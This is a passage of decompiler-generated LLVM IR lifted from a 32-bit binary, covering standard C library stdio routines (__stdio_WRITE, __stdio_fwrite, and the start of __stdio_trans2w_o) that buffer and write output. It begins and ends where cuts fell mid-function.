  %storemerge1 = phi i32 [ %v2_8054a18, %dec_label_pc_8054a16 ], [ -1, %dec_label_pc_80549c9 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_805499f, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8054a04, { 0, 2, 1 }
  uselistorder i32 %v1_8054a01, { 0, 2, 1 }
  uselistorder i32 %v2_80549ed, { 1, 0, 2 }
  uselistorder i32 %v0_80549f0, { 1, 0 }
  uselistorder i32 %v2_80549fb1532, { 1, 0 }
  uselistorder i32 %v4_80549a3, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 2, 1, 6, 3, 4, 7, 0, 5 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054a1a, { 1, 0 }
  uselistorder label %dec_label_pc_8054a16, { 1, 0 }
  uselistorder label %dec_label_pc_80549f4, { 1, 0 }
  uselistorder label %dec_label_pc_80549ed, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80549e3, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8054a25 = load i32, i32* @edi, align 4
  %v0_8054a27 = load i32, i32* @ebx, align 4
  %v4_8054a2b = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054a2b, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8054a374 = icmp eq i32 %arg3, 0
  br i1 %v1_8054a374, label %dec_label_pc_8054a96, label %dec_label_pc_8054a3c.lr.ph

dec_label_pc_8054a3c.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054a3c

dec_label_pc_8054a3c:                             ; preds = %dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge, %dec_label_pc_8054a3c.lr.ph
  %v0_8054a4c = phi i32 [ %v4_8054a2b, %dec_label_pc_8054a3c.lr.ph ], [ %v0_8054a4c.pre, %dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge ]
  %v0_8054a4b = phi i32 [ %arg2, %dec_label_pc_8054a3c.lr.ph ], [ %v2_8054a5d, %dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge ]
  %v0_8054a3e.in = phi i32 [ %arg3, %dec_label_pc_8054a3c.lr.ph ], [ %v2_8054a5b, %dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge ]
  %v0_8054a3e = icmp slt i32 %v0_8054a3e.in, 0
  store i32 %v0_8054a3e.in, i32* %ebp.global-to-local, align 4
  %v2_8054a3e = icmp eq i1 %v0_8054a3e, false
  %storemerge = select i1 %v2_8054a3e, i32 %v0_8054a3e.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8054a4c = add i32 %v0_8054a4c, 4
  %v2_8054a4c = inttoptr i32 %v1_8054a4c to i32*
  %v3_8054a4c = load i32, i32* %v2_8054a4c, align 4
  %tmp36 = inttoptr i32 %v0_8054a4b to i32*
  %v5_8054a4f = call i32 @__libc_write(i32 %v3_8054a4c, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8054a4f, i32* %eax.global-to-local, align 4
  %v2_8054a57 = icmp slt i32 %v5_8054a4f, 0
  br i1 %v2_8054a57, label %dec_label_pc_8054a61, label %dec_label_pc_8054a5b

dec_label_pc_8054a5b:                             ; preds = %dec_label_pc_8054a3c
  %v0_8054a5b = load i32, i32* @ebx, align 4
  %v2_8054a5b = sub i32 %v0_8054a5b, %v5_8054a4f
  %v12_8054a5b = icmp eq i32 %v2_8054a5b, 0
  store i32 %v2_8054a5b, i32* @ebx, align 4
  %v0_8054a5d = load i32, i32* %esi.global-to-local, align 4
  %v2_8054a5d = add i32 %v0_8054a5d, %v5_8054a4f
  store i32 %v2_8054a5d, i32* %esi.global-to-local, align 4
  br i1 %v12_8054a5b, label %dec_label_pc_8054a96, label %dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge

dec_label_pc_8054a5b.dec_label_pc_8054a3c_crit_edge: ; preds = %dec_label_pc_8054a5b
  %v0_8054a4c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054a3c

dec_label_pc_8054a61:                             ; preds = %dec_label_pc_8054a3c
  %v0_8054a61 = load i32, i32* @edi, align 4
  %v1_8054a61 = add i32 %v0_8054a61, 8
  %v2_8054a61 = inttoptr i32 %v1_8054a61 to i32*
  %v3_8054a61 = load i32, i32* %v2_8054a61, align 4
  store i32 %v3_8054a61, i32* @edx, align 4
  %v1_8054a64 = add i32 %v0_8054a61, 12
  %v2_8054a64 = inttoptr i32 %v1_8054a64 to i32*
  %v3_8054a64 = load i32, i32* %v2_8054a64, align 4
  store i32 %v3_8054a64, i32* %eax.global-to-local, align 4
  %v1_8054a67 = inttoptr i32 %v0_8054a61 to i16*
  %v2_8054a67 = load i16, i16* %v1_8054a67, align 2
  %v3_8054a67 = or i16 %v2_8054a67, 8
  store i16 %v3_8054a67, i16* %v1_8054a67, align 2
  %v0_8054a6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a6b = load i32, i32* @edx, align 4
  %v2_8054a6b = sub i32 %v0_8054a6b, %v1_8054a6b
  %v12_8054a6b = icmp eq i32 %v2_8054a6b, 0
  store i32 %v2_8054a6b, i32* %eax.global-to-local, align 4
  %v4_8054a92.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8054a6b, label %dec_label_pc_8054a92, label %dec_label_pc_8054a6f

dec_label_pc_8054a6f:                             ; preds = %dec_label_pc_8054a61
  %v6_8054a71 = icmp ugt i32 %v2_8054a6b, %v4_8054a92.pre
  br i1 %v6_8054a71, label %dec_label_pc_8054a75.preheader, label %dec_label_pc_8054a73

dec_label_pc_8054a73:                             ; preds = %dec_label_pc_8054a6f
  store i32 %v2_8054a6b, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054a75.preheader

dec_label_pc_8054a75.preheader:                   ; preds = %dec_label_pc_8054a73, %dec_label_pc_8054a6f
  %v0_8054a75.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054a75

dec_label_pc_8054a75:                             ; preds = %dec_label_pc_8054a75.preheader, %dec_label_pc_8054a87
  %v2_8054a77 = phi i32 [ %v1_8054a6b, %dec_label_pc_8054a75.preheader ], [ %v1_8054a83, %dec_label_pc_8054a87 ]
  %v4_8054a75 = phi i32 [ %v2_8054a6b, %dec_label_pc_8054a75.preheader ], [ %v0_8054a79, %dec_label_pc_8054a87 ]
  %v0_8054a75 = phi i32 [ %v0_8054a75.pre, %dec_label_pc_8054a75.preheader ], [ %v1_8054a87, %dec_label_pc_8054a87 ]
  %v1_8054a75 = inttoptr i32 %v0_8054a75 to i8*
  %v2_8054a75 = load i8, i8* %v1_8054a75, align 1
  %v3_8054a75 = zext i8 %v2_8054a75 to i32
  %v5_8054a75 = and i32 %v4_8054a75, -256
  %v6_8054a75 = or i32 %v3_8054a75, %v5_8054a75
  store i32 %v6_8054a75, i32* %eax.global-to-local, align 4
  %v3_8054a77 = inttoptr i32 %v2_8054a77 to i8*
  store i8 %v2_8054a75, i8* %v3_8054a77, align 1
  %v0_8054a79 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a79 = trunc i32 %v0_8054a79 to i8
  %v10_8054a79 = icmp eq i8 %v1_8054a79, 10
  %v1_8054a7b = icmp eq i1 %v10_8054a79, false
  br i1 %v1_8054a7b, label %dec_label_pc_8054a83, label %dec_label_pc_8054a7d

dec_label_pc_8054a7d:                             ; preds = %dec_label_pc_8054a75
  %v0_8054a7d = load i32, i32* @edi, align 4
  %v1_8054a7d = add i32 %v0_8054a7d, 1
  %v2_8054a7d = inttoptr i32 %v1_8054a7d to i8*
  %v3_8054a7d = load i8, i8* %v2_8054a7d, align 1
  %v4_8054a7d = urem i8 %v3_8054a7d, 2
  %v5_8054a7d = icmp eq i8 %v4_8054a7d, 0
  %v1_8054a81 = icmp eq i1 %v5_8054a7d, false
  br i1 %v1_8054a81, label %dec_label_pc_8054a7d.dec_label_pc_8054a8a_crit_edge, label %dec_label_pc_8054a83

dec_label_pc_8054a7d.dec_label_pc_8054a8a_crit_edge: ; preds = %dec_label_pc_8054a7d
  %v0_8054a8a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054a8a

dec_label_pc_8054a83:                             ; preds = %dec_label_pc_8054a7d, %dec_label_pc_8054a75
  %v0_8054a83 = load i32, i32* @edx, align 4
  %v1_8054a83 = add i32 %v0_8054a83, 1
  store i32 %v1_8054a83, i32* @edx, align 4
  %v0_8054a84 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054a84 = add i32 %v0_8054a84, -1
  %v8_8054a84 = icmp eq i32 %v1_8054a84, 0
  store i32 %v1_8054a84, i32* %ebp.global-to-local, align 4
  br i1 %v8_8054a84, label %dec_label_pc_8054a83.dec_label_pc_8054a8a_crit_edge, label %dec_label_pc_8054a87

dec_label_pc_8054a83.dec_label_pc_8054a8a_crit_edge: ; preds = %dec_label_pc_8054a83
  %v1_8054a8a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054a8a

dec_label_pc_8054a87:                             ; preds = %dec_label_pc_8054a83
  %v0_8054a87 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054a87 = add i32 %v0_8054a87, 1
  store i32 %v1_8054a87, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054a75

dec_label_pc_8054a8a:                             ; preds = %dec_label_pc_8054a83.dec_label_pc_8054a8a_crit_edge, %dec_label_pc_8054a7d.dec_label_pc_8054a8a_crit_edge
  %v1_8054a8a = phi i32 [ %v0_8054a7d, %dec_label_pc_8054a7d.dec_label_pc_8054a8a_crit_edge ], [ %v1_8054a8a.pre, %dec_label_pc_8054a83.dec_label_pc_8054a8a_crit_edge ]
  %v0_8054a8a = phi i32 [ %v0_8054a8a.pre, %dec_label_pc_8054a7d.dec_label_pc_8054a8a_crit_edge ], [ %v1_8054a83, %dec_label_pc_8054a83.dec_label_pc_8054a8a_crit_edge ]
  %v2_8054a8a = add i32 %v1_8054a8a, 16
  %v3_8054a8a = inttoptr i32 %v2_8054a8a to i32*
  store i32 %v0_8054a8a, i32* %v3_8054a8a, align 4
  %v0_8054a8d = load i32, i32* @edx, align 4
  %v1_8054a8d = load i32, i32* @edi, align 4
  %v2_8054a8d = add i32 %v1_8054a8d, 8
  %v3_8054a8d = inttoptr i32 %v2_8054a8d to i32*
  %v4_8054a8d = load i32, i32* %v3_8054a8d, align 4
  %v5_8054a8d = sub i32 %v0_8054a8d, %v4_8054a8d
  store i32 %v5_8054a8d, i32* @edx, align 4
  %v0_8054a90 = load i32, i32* @ebx, align 4
  %v2_8054a90 = sub i32 %v0_8054a90, %v5_8054a8d
  br label %dec_label_pc_8054a92

dec_label_pc_8054a92:                             ; preds = %dec_label_pc_8054a61, %dec_label_pc_8054a8a
  %v4_8054a92 = phi i32 [ %v2_8054a90, %dec_label_pc_8054a8a ], [ %v4_8054a92.pre, %dec_label_pc_8054a61 ]
  %v5_8054a92 = sub i32 %arg3, %v4_8054a92
  br label %dec_label_pc_8054a96

dec_label_pc_8054a96:                             ; preds = %dec_label_pc_8054a5b, %entry, %dec_label_pc_8054a92
  %stack_var_12.0 = phi i32 [ %v5_8054a92, %dec_label_pc_8054a92 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8054a5b ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8054a27, i32* @ebx, align 4
  store i32 %v0_8054a25, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8054a87, { 1, 0 }
  uselistorder i32 %v1_8054a84, { 1, 0 }
  uselistorder i32 %v1_8054a83, { 0, 2, 1 }
  uselistorder i32 %v0_8054a79, { 1, 0 }
  uselistorder i32 %v2_8054a5d, { 1, 0 }
  uselistorder i32 %v2_8054a5b, { 1, 2, 0 }
  uselistorder i32 %v5_8054a4f, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8054a96, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054a92, { 1, 0 }
  uselistorder label %dec_label_pc_8054a75, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054aa4 = load i32, i32* @ebp, align 4
  %v0_8054aa5 = load i32, i32* @edi, align 4
  %v0_8054aa6 = load i32, i32* @esi, align 4
  %v0_8054aa7 = load i32, i32* @ebx, align 4
  store i32 %v0_8054aa7, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8054ab7 = add i32 %arg3, 1
  %v2_8054ab7 = inttoptr i32 %v1_8054ab7 to i8*
  %v3_8054ab7 = load i8, i8* %v2_8054ab7, align 1
  %v4_8054ab7 = and i8 %v3_8054ab7, 2
  %v5_8054ab7 = icmp eq i8 %v4_8054ab7, 0
  %v1_8054abb = icmp eq i1 %v5_8054ab7, false
  br i1 %v1_8054abb, label %dec_label_pc_8054b72, label %dec_label_pc_8054ac1

dec_label_pc_8054ac1:                             ; preds = %entry
  %v1_8054ac1 = add i32 %arg3, 4
  %v2_8054ac1 = inttoptr i32 %v1_8054ac1 to i32*
  %v3_8054ac1 = load i32, i32* %v2_8054ac1, align 4
  %v13_8054ac1 = icmp eq i32 %v3_8054ac1, -2
  %v1_8054ac5 = add i32 %arg3, 16
  %v2_8054ac5 = inttoptr i32 %v1_8054ac5 to i32*
  %v3_8054ac5 = load i32, i32* %v2_8054ac5, align 4
  store i32 %v3_8054ac5, i32* @edx, align 4
  %v1_8054ac8 = add i32 %arg3, 12
  %v2_8054ac8 = inttoptr i32 %v1_8054ac8 to i32*
  %v3_8054ac8 = load i32, i32* %v2_8054ac8, align 4
  %v1_8054acb = icmp eq i1 %v13_8054ac1, false
  %v2_8054aeb = sub i32 %v3_8054ac8, %v3_8054ac5
  store i32 %v2_8054aeb, i32* %eax.global-to-local, align 4
  br i1 %v1_8054acb, label %dec_label_pc_8054aeb, label %dec_label_pc_8054acd

dec_label_pc_8054acd:                             ; preds = %dec_label_pc_8054ac1
  %tmp22 = icmp ult i32 %v2_8054aeb, %arg2
  br i1 %tmp22, label %dec_label_pc_8054ad5, label %dec_label_pc_8054ad7

dec_label_pc_8054ad5:                             ; preds = %dec_label_pc_8054acd
  br label %dec_label_pc_8054ad7

dec_label_pc_8054ad7:                             ; preds = %dec_label_pc_8054acd, %dec_label_pc_8054ad5
  %storemerge = phi i32 [ %v2_8054aeb, %dec_label_pc_8054ad5 ], [ %arg2, %dec_label_pc_8054acd ]
  %v0_8054ad8 = phi i32 [ %v2_8054aeb, %dec_label_pc_8054ad5 ], [ %arg2, %dec_label_pc_8054acd ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8054adb = inttoptr i32 %v3_8054ac5 to i16*
  %v4_8054adb = call i32 @memcpy(i16* %v3_8054adb, i32 %v0_8054ad8, i32 %v2_8054aeb)
  store i32 %v4_8054adb, i32* %eax.global-to-local, align 4
  %v0_8054ae0 = load i32, i32* @ebx, align 4
  %v1_8054ae0 = add i32 %v0_8054ae0, 16
  %v2_8054ae0 = inttoptr i32 %v1_8054ae0 to i32*
  %v3_8054ae0 = load i32, i32* %v2_8054ae0, align 4
  %v4_8054ae0 = load i32, i32* @esi, align 4
  %v5_8054ae0 = add i32 %v4_8054ae0, %v3_8054ae0
  store i32 %v5_8054ae0, i32* %v2_8054ae0, align 4
  br label %dec_label_pc_8054b8a

dec_label_pc_8054aeb:                             ; preds = %dec_label_pc_8054ac1
  %v6_8054aef = icmp ult i32 %v2_8054aeb, %arg2
  br i1 %v6_8054aef, label %dec_label_pc_8054b59, label %dec_label_pc_8054af1

dec_label_pc_8054af1:                             ; preds = %dec_label_pc_8054aeb
  %v0_8054af1 = load i32, i32* @ecx, align 4
  %v3_8054af5 = inttoptr i32 %v3_8054ac5 to i16*
  %v4_8054af5 = call i32 @memcpy(i16* %v3_8054af5, i32 %arg2, i32 %v0_8054af1)
  store i32 %v4_8054af5, i32* %eax.global-to-local, align 4
  %v0_8054afa = load i32, i32* @ebx, align 4
  %v1_8054afa = add i32 %v0_8054afa, 16
  %v2_8054afa = inttoptr i32 %v1_8054afa to i32*
  %v3_8054afa = load i32, i32* %v2_8054afa, align 4
  %v4_8054afa = load i32, i32* @edi, align 4
  %v5_8054afa = add i32 %v4_8054afa, %v3_8054afa
  store i32 %v5_8054afa, i32* %v2_8054afa, align 4
  %v0_8054b00 = load i32, i32* @ebx, align 4
  %v1_8054b00 = add i32 %v0_8054b00, 1
  %v2_8054b00 = inttoptr i32 %v1_8054b00 to i8*
  %v3_8054b00 = load i8, i8* %v2_8054b00, align 1
  %v4_8054b00 = urem i8 %v3_8054b00, 2
  %v5_8054b00 = icmp eq i8 %v4_8054b00, 0
  br i1 %v5_8054b00, label %dec_label_pc_8054b8a, label %dec_label_pc_8054b0a

dec_label_pc_8054b0a:                             ; preds = %dec_label_pc_8054af1
  %v0_8054b0a = load i32, i32* @edx, align 4
  %v0_8054b0b = load i32, i32* @edi, align 4
  %v4_8054b0f = call i32 @memrchr(i8 10, i32 %v0_8054b0b, i32 %v0_8054b0a)
  store i32 %v4_8054b0f, i32* %eax.global-to-local, align 4
  %v1_8054b17 = icmp eq i32 %v4_8054b0f, 0
  br i1 %v1_8054b17, label %dec_label_pc_8054b8a, label %dec_label_pc_8054b1b

dec_label_pc_8054b1b:                             ; preds = %dec_label_pc_8054b0a
  %v0_8054b1e = load i32, i32* @ebx, align 4
  %v1_8054b1f = call i32 @__stdio_wcommit(i32 %v0_8054b1e)
  store i32 %v1_8054b1f, i32* %eax.global-to-local, align 4
  %v1_8054b27 = icmp eq i32 %v1_8054b1f, 0
  br i1 %v1_8054b27, label %dec_label_pc_8054b8a, label %dec_label_pc_8054b2b

dec_label_pc_8054b2b:                             ; preds = %dec_label_pc_8054b1b
  %v0_8054b2b = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8054b2b, %v1_8054b1f
  br i1 %tmp23, label %dec_label_pc_8054b31, label %dec_label_pc_8054b33

dec_label_pc_8054b31:                             ; preds = %dec_label_pc_8054b2b
  br label %dec_label_pc_8054b33

dec_label_pc_8054b33:                             ; preds = %dec_label_pc_8054b2b, %dec_label_pc_8054b31
  %storemerge24 = phi i32 [ %v1_8054b1f, %dec_label_pc_8054b31 ], [ %v0_8054b2b, %dec_label_pc_8054b2b ]
  %v0_8054b3a = phi i32 [ %v1_8054b1f, %dec_label_pc_8054b31 ], [ %v0_8054b2b, %dec_label_pc_8054b2b ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8054b35 = sub i32 %v0_8054b2b, %v0_8054b3a
  store i32 %v2_8054b35, i32* %eax.global-to-local, align 4
  %v0_8054b37 = load i32, i32* @ebp, align 4
  %v2_8054b37 = add i32 %v0_8054b37, %v2_8054b35
  store i32 %v2_8054b37, i32* %ebp.global-to-local, align 4
  %v4_8054b3e = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8054b3a, i32 %v2_8054b35)
  store i32 %v4_8054b3e, i32* %eax.global-to-local, align 4
  store i32 %v4_8054b3e, i32* @edx, align 4
  %v1_8054b48 = icmp eq i32 %v4_8054b3e, 0
  br i1 %v1_8054b48, label %dec_label_pc_8054b8a, label %dec_label_pc_8054b4c

dec_label_pc_8054b4c:                             ; preds = %dec_label_pc_8054b33
  %v0_8054b4c = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054b4c = load i32, i32* %esi.global-to-local, align 4
  %v2_8054b4c = sub i32 %v0_8054b4c, %v4_8054b3e
  %v2_8054b50 = add i32 %v2_8054b4c, %v1_8054b4c
  store i32 %v2_8054b50, i32* %eax.global-to-local, align 4
  %v0_8054b52 = load i32, i32* @ebx, align 4
  %v1_8054b52 = add i32 %v0_8054b52, 16
  %v2_8054b52 = inttoptr i32 %v1_8054b52 to i32*
  %v3_8054b52 = load i32, i32* %v2_8054b52, align 4
  %v5_8054b52 = sub i32 %v3_8054b52, %v2_8054b50
  store i32 %v5_8054b52, i32* %v2_8054b52, align 4
  %v0_8054b55 = load i32, i32* @edi, align 4
  %v1_8054b55 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054b55 = sub i32 %v0_8054b55, %v1_8054b55
  store i32 %v2_8054b55, i32* @edi, align 4
  br label %dec_label_pc_8054b8a

dec_label_pc_8054b59:                             ; preds = %dec_label_pc_8054aeb
  %v2_8054b59 = add i32 %arg3, 8
  %v3_8054b59 = inttoptr i32 %v2_8054b59 to i32*
  %v4_8054b59 = load i32, i32* %v3_8054b59, align 4
  %v15_8054b59 = icmp eq i32 %v3_8054ac5, %v4_8054b59
  br i1 %v15_8054b59, label %dec_label_pc_8054b72, label %dec_label_pc_8054b5e

dec_label_pc_8054b5e:                             ; preds = %dec_label_pc_8054b59
  %v1_8054b62 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8054b62, i32* %eax.global-to-local, align 4
  %v1_8054b6a = icmp eq i32 %v1_8054b62, 0
  br i1 %v1_8054b6a, label %dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge, label %dec_label_pc_8054b6e

dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge: ; preds = %dec_label_pc_8054b5e
  %v0_8054b72.pre = load i32, i32* @edi, align 4
  %v0_8054b7a.pre = load i32, i32* @ebx, align 4
  %v2_8054b81.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054b72

dec_label_pc_8054b6e:                             ; preds = %dec_label_pc_8054b5e
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8054b8a

dec_label_pc_8054b72:                             ; preds = %dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge, %dec_label_pc_8054b59, %entry
  %v2_8054b81 = phi i32 [ %v2_8054b81.pre, %dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge ], [ %v0_8054aa7, %dec_label_pc_8054b59 ], [ %v0_8054aa7, %entry ]
  %v0_8054b7a = phi i32 [ %v0_8054b7a.pre, %dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge ], [ %arg3, %dec_label_pc_8054b59 ], [ %arg3, %entry ]
  %v0_8054b72 = phi i32 [ %v0_8054b72.pre, %dec_label_pc_8054b5e.dec_label_pc_8054b72_crit_edge ], [ %arg2, %dec_label_pc_8054b59 ], [ %arg2, %entry ]
  store i32 %v2_8054b81, i32* @ebx, align 4
  store i32 %v0_8054aa5, i32* @edi, align 4
  %v4_8054b85 = inttoptr i32 %v0_8054b7a to i16*
  %v5_8054b85 = call i32 @__stdio_WRITE(i16* %v4_8054b85, i32 %v0_8054b72, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054b85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b8a

dec_label_pc_8054b8a:                             ; preds = %dec_label_pc_8054b33, %dec_label_pc_8054b1b, %dec_label_pc_8054b0a, %dec_label_pc_8054af1, %dec_label_pc_8054b6e, %dec_label_pc_8054b4c, %dec_label_pc_8054ad7, %dec_label_pc_8054b72
  %v0_8054b8d = load i32, i32* @edi, align 4
  store i32 %v0_8054b8d, i32* %eax.global-to-local, align 4
  %v2_8054b8f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054b8f, i32* @ebx, align 4
  store i32 %v0_8054aa6, i32* @esi, align 4
  store i32 %v0_8054aa5, i32* @edi, align 4
  store i32 %v0_8054aa4, i32* @ebp, align 4
  ret i32 %v0_8054b8d

; uselistorder directives
  uselistorder i32 %v2_8054b50, { 1, 0 }
  uselistorder i32 %v4_8054b3e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054b35, { 1, 0, 2 }
  uselistorder i32 %v0_8054b2b, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8054aeb, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8054aa5, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8054b8a, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8054b33, { 1, 0 }
  uselistorder label %dec_label_pc_8054ad7, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054b94 = load i32, i32* @ebx, align 4
  %v4_8054b98 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054b98, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8054ba0 = bitcast i16* %arg1 to i32*
  %v2_8054ba0 = load i32, i32* %v1_8054ba0, align 4
  store i32 %v2_8054ba0, i32* %eax.global-to-local, align 4
  %v1_8054ba2 = urem i32 %v2_8054ba0, 65536
  store i32 %v1_8054ba2, i32* %edx.global-to-local, align 4
  %v2_8054ba5 = and i32 %v1_8054ba2, %arg2
  %v3_8054ba5 = icmp eq i32 %v2_8054ba5, 0
  %v1_8054ba7 = icmp eq i1 %v3_8054ba5, false
  br i1 %v1_8054ba7, label %dec_label_pc_8054bb6, label %dec_label_pc_8054ba9

dec_label_pc_8054ba9:                             ; preds = %entry
  %v1_8054ba9 = and i32 %v2_8054ba0, 2176
  %v2_8054ba9 = icmp eq i32 %v1_8054ba9, 0
  store i32 %v1_8054ba9, i32* %edx.global-to-local, align 4
  %v1_8054baf = icmp eq i1 %v2_8054ba9, false
  br i1 %v1_8054baf, label %dec_label_pc_8054bbe, label %dec_label_pc_8054bb1

dec_label_pc_8054bb1:                             ; preds = %dec_label_pc_8054ba9
  %v2_8054bb1 = or i32 %v2_8054ba0, %arg2
  store i32 %v2_8054bb1, i32* %eax.global-to-local, align 4
  %v1_8054bb3 = trunc i32 %v2_8054bb1 to i16
  store i16 %v1_8054bb3, i16* %arg1, align 2
  %v0_8054bb6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054bb6

dec_label_pc_8054bb6:                             ; preds = %entry, %dec_label_pc_8054bb1
  %v0_8054bfb = phi i32 [ %v4_8054b98, %entry ], [ %v0_8054bb6.pre, %dec_label_pc_8054bb1 ]
  %v1_8054bb6 = inttoptr i32 %v0_8054bfb to i16*
  %v2_8054bb6 = load i16, i16* %v1_8054bb6, align 2
  %v3_8054bb6 = zext i16 %v2_8054bb6 to i32
  store i32 %v3_8054bb6, i32* %edx.global-to-local, align 4
  %v2_8054bb9 = and i16 %v2_8054bb6, 32
  %v3_8054bb9 = icmp eq i16 %v2_8054bb9, 0
  br i1 %v3_8054bb9, label %dec_label_pc_8054bd2, label %dec_label_pc_8054bbe

dec_label_pc_8054bbe:                             ; preds = %dec_label_pc_8054bb6, %dec_label_pc_8054ba9
  %v1_8054bbe = call i32 @__errno_location(i32 %v0_8054b94)
  store i32 %v1_8054bbe, i32* %eax.global-to-local, align 4
  %v1_8054bc3 = inttoptr i32 %v1_8054bbe to i32*
  store i32 9, i32* %v1_8054bc3, align 4
  br label %dec_label_pc_8054bc9

dec_label_pc_8054bc9:                             ; preds = %dec_label_pc_8054be9, %dec_label_pc_8054bbe
  %v0_8054bc9 = load i32, i32* @ebx, align 4
  %v1_8054bc9 = inttoptr i32 %v0_8054bc9 to i16*
  %v2_8054bc9 = load i16, i16* %v1_8054bc9, align 2
  %v3_8054bc9 = or i16 %v2_8054bc9, 8
  store i16 %v3_8054bc9, i16* %v1_8054bc9, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054c2c

dec_label_pc_8054bd2:                             ; preds = %dec_label_pc_8054bb6
  %v2_8054bd2 = urem i16 %v2_8054bb6, 4
  %v3_8054bd2 = icmp eq i16 %v2_8054bd2, 0
  br i1 %v3_8054bd2, label %dec_label_pc_8054c18, label %dec_label_pc_8054bd7

